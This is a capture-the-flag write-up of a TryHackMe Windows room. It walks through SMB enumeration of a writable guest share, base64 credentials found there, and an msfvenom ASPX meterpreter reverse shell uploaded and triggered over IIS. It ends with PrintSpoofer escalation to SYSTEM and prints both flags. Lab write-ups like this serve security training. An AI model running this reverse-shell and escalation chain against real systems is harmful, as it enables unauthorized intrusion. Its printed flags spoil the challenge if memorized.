**So here are the rules and hints we get from the challenge:**

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)
- Note - Nothing in this room requires Metasploit
- Writeups will not be accepted for this room.

**Alright lets start**

**First we have to connect to the vpn,** 

```bash
2025-12-16 06:21:58 Initialization Sequence Completed
2025-12-16 06:21:58 Data Channel: cipher 'AES-256-GCM', peer-id: 288
2025-12-16 06:21:58 Timers: ping 10, ping-restart 120
2025-12-16 06:21:58 Protocol options: explicit-exit-notify 1, protocol-flags cc-exit tls-ekm dyn-tls-crypt
```

**I'll try scanning the machine for any services that could be running** 

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -T4 10.64.160.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 07:16 EST
Nmap scan report for 10.64.160.63
Host is up (0.15s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-12-16T12:16:50+00:00
|_ssl-date: 2025-12-16T12:17:30+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-12-15T12:08:06
|_Not valid after:  2026-06-16T12:08:06
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-16T12:16:54
|_  start_date: 2025-12-16T12:08:06
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-16T04:16:53-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.68 seconds
```
So the open services on the machine are HTTP, RPC, SMB , and RDP
First ill have to try smb enumeration,

```sh
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.64.160.63 -N       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.64.160.63 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ smbclient //10.64.160.63/ADMIN$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                          
┌──(kali㉿kali)-[~]
└─$ smbclient //10.64.160.63/C$ -N    
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                          
┌──(kali㉿kali)-[~]
└─$ smbclient //10.64.160.63/IPC$ -N  
Try "help" to get a list of possible commands.
smb: \> shares
shares: command not found
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> 
```

**It appears we established a connection with the IPC$ which is not very useful lets try another way**

```sh
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                            [|] Checking for open ports...                                                            [/] Checking for open ports...                                                            [-] Checking for open ports...                                                            [*] Detected 1 hosts serving SMB        
[\] Authenticating...                                                                     [|] Authenticating...                                                                     [/] Authenticating...                                                                     [-] Authenticating...                                                                     [\] Authenticating...                                                                     [|] Authenticating...                                                                     [/] Authenticating...                                                                     [-] Authenticating...                                                                     [\] Authenticating...                                                                     [|] Authenticating...                                                                     [/] Authenticating...                                                                     [-] Authenticating...                                                                     [\] Authenticating...                                                                     [|] Authenticating...                                                                     [/] Authenticating...                                                                     [*] Established 0 SMB connections(s) and 0 authenticated session(s)
[-] Closing connections..                                                                 [\] Closing connections..                                                                 [|] Closing connections..                                                                 [/] Closing connections..                                                                 [-] Closing connections..                                                                                                                                                           [*] Closed 0 connections
                                                                                          
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 10.64.160.63
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 16 07:27:37 2025

 =========================================( Target Information )=========================================                                                                           
                                                                                          
Target ........... 10.64.160.63                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.64.160.63 )============================                                                                           
                                                                                          
                                                                                          
[E] Can't find workgroup/domain                                                           
                                                                                          
                                                                                          

 ================================( Nbtstat Information for 10.64.160.63 )================================                                                                           
                                                                                          
Looking up status of 10.64.160.63                                                         
No reply from 10.64.160.63

 ===================================( Session Check on 10.64.160.63 )===================================                                                                            
                                                                                          
                                                                                          
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                                                                                      
                                                                                          
                                                                                          
┌──(kali㉿kali)-[~]
└─$ rpcclient -U "" -N 10.64.160.63   
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
**lets try seeing what we get as user 'guest' with crackmapexec**

```sh
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.64.160.63 -u 'guest' -p ''

SMB         10.64.160.63    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.64.160.63    445    RELEVANT         [+] Relevant\guest: 
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient -L //┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.64.160.63 -u '' -p ''

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.64.160.63    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.64.160.63    445    RELEVANT         [-] Relevant\: STATUS_ACCESS_DENIED 
                                                                                          
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.64.160.63 -u 'guest' -p ''

SMB         10.64.160.63    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.64.160.63    445    RELEVANT         [+] Relevant\guest: 

                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.64.160.63 -U guest%        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.64.160.63 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.64.160.63 -u guest      

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                              [|] Checking for open ports...                                                                              [/] Checking for open ports...                                                                              [-] Checking for open ports...                                                                              [*] Detected 1 hosts serving SMB
[\] Authenticating...                                                                                       [|] Authenticating...                                                                                       [/] Authenticating...                                                                                       [-] Authenticating...                                                                                       [\] Authenticating...                                                                                       [|] Authenticating...                                                                                       [/] Authenticating...                                                                                       [-] Authenticating...                                                                                       [\] Authenticating...                                                                                       [|] Authenticating...                                                                                       [/] Authenticating...                                                                                       [-] Authenticating...                                                                                       [\] Authenticating...                                                                                       [|] Authenticating...                                                                                       [/] Authenticating...                                                                                       [*] Established 1 SMB connections(s) and 1 authenticated session(s)
[-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                   [\] Enumerating shares...                                                                                   [|] Enumerating shares...                                                                                   [/] Enumerating shares...                                                                                   [-] Enumerating shares...                                                                                                                                                                                       
[+] IP: 10.64.160.63:445        Name: 10.64.160.63              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
[\] Closing connections..                                                                                   [|] Closing connections..                                                                                   [/] Closing connections..                                                                                   [-] Closing connections..                                                                                   [\] Closing connections..                                                                                   [|] Closing connections..                                                                                   [/] Closing connections..                                                                                   [-] Closing connections..                                                                                   [*] Closed 1 connections
```

**Jackpot we see that the user guest doesnt require a password and that we can read and write to share nt4wrksv**
```sh
┌──(kali㉿kali)-[~]
└─$ smbclient  //10.64.160.63/nt4wrksv -U guest% 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Dec 16 07:30:34 2025
  ..                                  D        0  Tue Dec 16 07:30:34 2025
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5101049 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

**Nice we got password.txt lets look inside now**

```sh
┌──(kali㉿kali)-[~]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

**These look like they are b64 encoded the == gives it away lets check if thats the case** 

<img width="459" height="685" alt="image" src="https://github.com/user-attachments/assets/f5022efb-63eb-4981-bcc7-568df54d3503" />

Looks like the first user-password combination is Bob - !P@$$W0rD!123
and the second one is Bill - Juw4nnaM4n420696969!$$$

```sh
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.64.160.63 -u 'Bob' -p '!P@$$W0rD!123' --shares
SMB         10.64.160.63    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.64.160.63    445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
SMB         10.64.160.63    445    RELEVANT         [+] Enumerated shares
SMB         10.64.160.63    445    RELEVANT         Share           Permissions     Remark
SMB         10.64.160.63    445    RELEVANT         -----           -----------     ------
SMB         10.64.160.63    445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.64.160.63    445    RELEVANT         C$                              Default share
SMB         10.64.160.63    445    RELEVANT         IPC$                            Remote IPC
SMB         10.64.160.63    445    RELEVANT         nt4wrksv        READ,WRITE      
                                                                                          
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.64.160.63 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$' --shares
SMB         10.64.160.63    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.64.160.63    445    RELEVANT         [+] Relevant\Bill:Juw4nnaM4n420696969!$$$ 
SMB         10.64.160.63    445    RELEVANT         [+] Enumerated shares
SMB         10.64.160.63    445    RELEVANT         Share           Permissions     Remark
SMB         10.64.160.63    445    RELEVANT         -----           -----------     ------
SMB         10.64.160.63    445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.64.160.63    445    RELEVANT         C$                              Default share
SMB         10.64.160.63    445    RELEVANT         IPC$                            Remote IPC
SMB         10.64.160.63    445    RELEVANT         nt4wrksv        READ,WRITE      

```

**Looks like they do not have any special privileges** 
Lets run a vulnerability scan on nmap 

```sh
Nmap scan report for 10.67.190.109
Host is up (0.14s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 98.68 seconds
```
Found that the smb server is vulnerable to CVE-2017-0143

lets create a shell.
```sh
┌──(kali㉿kali)-[~]
└─$ sudo su                                     
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.192.198 LPORT=4444 -f aspx -o shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of aspx file: 1030495 bytes
Saved as: shell.aspx
```
now we set up a listener on metasploit and put the shell in the smb share that we found earlier:

```sh
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.192.198
lhost => 192.168.192.198
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.192.198:4444 

┌──(kali㉿kali)-[~]
└─$ smbclient //10.67.166.237/nt4wrksv -U guest%

Try "help" to get a list of possible commands.
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (749.3 kb/s) (average 749.3 kb/s)
smb: \> 

┌──(kali㉿kali)-[~]
└─$ curl http://10.67.166.237:49663/nt4wrksv/shell.aspx
                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 

[*] Started reverse TCP handler on 192.168.192.198:4444 
[*] Meterpreter session 1 opened (192.168.192.198:4444 -> 10.67.166.237:49746) at 2025-12-16 09:20:40 -0500

meterpreter > 
```
and it worked

```sh
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > help
meterpreter > shell
Process 3540 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\windows\system32\inetsrv
c:\windows\system32\inetsrv>cd c:\Users
cd c:\Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  01:03 PM    <DIR>          .
07/25/2020  01:03 PM    <DIR>          ..
07/25/2020  07:05 AM    <DIR>          .NET v4.5
07/25/2020  07:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  09:30 AM    <DIR>          Administrator
07/25/2020  01:03 PM    <DIR>          Bob
07/25/2020  06:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  20,119,420,928 bytes free

c:\Users>cd Bob
cd Bob

c:\Users\Bob>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob

07/25/2020  01:03 PM    <DIR>          .
07/25/2020  01:03 PM    <DIR>          ..
07/25/2020  01:04 PM    <DIR>          Desktop
               0 File(s)              0 bytes
               3 Dir(s)  20,110,225,408 bytes free

c:\Users\Bob>cd Desktop
cd Desktop

c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  01:04 PM    <DIR>          .
07/25/2020  01:04 PM    <DIR>          ..
07/25/2020  07:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,109,361,152 bytes free

c:\Users\Bob\Desktop>more user.txt
more user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

**Looks like we got our first flag **
**THM{fdk4ka34vk346ksxfr21tg789ktf45}**
- I am now gonna use winPEAS to elevate my privilage 

```sh
PS C:\Users\Bob\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

we have this SeImpersonatePrivilege enabled so lets see what we can use that for...
Ill use https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0  

```sh
┌──(kali㉿kali)-[~]
└─$ smbclient //10.67.166.237/nt4wrksv -U guest%       
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe
PrintSpoofer64.exe does not exist
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (45.8 kb/s) (average 45.8 kb/s)

PS C:\> 
PS C:\> dir
dir


    Directory: C:\


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       12/16/2025   6:16 AM                badr                          
d-----        7/25/2020   8:16 AM                inetpub                       
d-----        7/25/2020   8:42 AM                Microsoft                     
d-----        7/16/2016   6:23 AM                PerfLogs                      
d-r---        7/25/2020   8:00 AM                Program Files                 
d-----        7/25/2020   4:15 PM                Program Files (x86)           
d-r---        7/25/2020   2:03 PM                Users                         
d-----        7/25/2020   4:16 PM                Windows                       


PS C:\> cd inetpub
cd inetpub
PS C:\inetpub> dir
dir


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        7/25/2020   8:07 AM                history                       
d-----        7/25/2020   8:05 AM                logs                          
d-----        7/25/2020   8:05 AM                temp                          
d-----        7/25/2020   2:46 PM                wwwroot                       
d-----        7/25/2020   2:04 PM                wwwroot1                      


PS C:\inetpub> cd wwwroot
cd wwwroot
PS C:\inetpub\wwwroot> dir
dir


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        7/25/2020   8:05 AM                aspnet_client                 
d-----       12/16/2025   6:18 AM                nt4wrksv                      
-a----        7/25/2020   8:05 AM            703 iisstart.htm                  
-a----        7/25/2020   8:05 AM          99710 iisstart.png                  


PS C:\inetpub\wwwroot> cd nt4wrksv
cd nt4wrksv
PS C:\inetpub\wwwroot\nt4wrksv> dir
dir


    Directory: C:\inetpub\wwwroot\nt4wrksv


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:15 AM             98 passwords.txt                 
-a----       12/16/2025   6:34 AM          27136 PrintSpoofer64.exe            
-a----       12/16/2025   6:18 AM        1030495 shell.aspx                    


PS C:\inetpub\wwwroot\nt4wrksv> 
```

After reading the documentation on the printspoofer64.exe ill try running it with either cm or powershell 

```sh
PS C:\inetpub\wwwroot\nt4wrksv> PrintSpoofer64.exe -i -c powershell

PrintSpoofer64.exe -i -c powershell
PrintSpoofer64.exe : The term 'PrintSpoofer64.exe' is not recognized as the 
name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is 
correct and try again.
At line:1 char:1
+ PrintSpoofer64.exe -i -c powershell
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (PrintSpoofer64.exe:String) [],  
   CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

Suggestion [3,General]: The command PrintSpoofer64.exe was not found, but does exist in the current location. Windows PowerShell does not load commands from the current location by default. If you trust this command, instead type: ".\PrintSpoofer64.exe". See "get-help about_Command_Precedence" for more details.
PS C:\inetpub\wwwroot\nt4wrksv> 
PS C:\inetpub\wwwroot\nt4wrksv> .\PrintSpoofer64.exe -i -c powershell
.\PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 
PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cd c:\users
cd c:\users
PS C:\users> dir
dir


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        7/25/2020   8:05 AM                .NET v4.5                     
d-----        7/25/2020   8:05 AM                .NET v4.5 Classic             
d-----        7/25/2020  10:30 AM                Administrator                 
d-----        7/25/2020   2:03 PM                Bob                           
d-r---        7/25/2020   7:58 AM                Public                        


PS C:\users> cd Administrator
cd Administrator
PS C:\users\Administrator> dir
dir


    Directory: C:\users\Administrator


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        7/25/2020   7:58 AM                Contacts                      
d-r---        7/25/2020   8:24 AM                Desktop                       
d-r---        7/25/2020   7:58 AM                Documents                     
d-r---        7/25/2020   8:39 AM                Downloads                     
d-r---        7/25/2020   7:58 AM                Favorites                     
d-r---        7/25/2020   7:58 AM                Links                         
d-r---        7/25/2020   7:58 AM                Music                         
d-r---        7/25/2020   7:58 AM                Pictures                      
d-r---        7/25/2020   7:58 AM                Saved Games                   
d-r---        7/25/2020   7:58 AM                Searches                      
d-r---        7/25/2020   7:58 AM                Videos                        


PS C:\users\Administrator> cd Desktop
cd Desktop
PS C:\users\Administrator\Desktop> dir
dir


    Directory: C:\users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:25 AM             35 root.txt                      


PS C:\users\Administrator\Desktop> more root.txt
more root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
And there we go, 
THM{1fk5kf469devly1gl320zafgl345pv}
heres the root flag :D
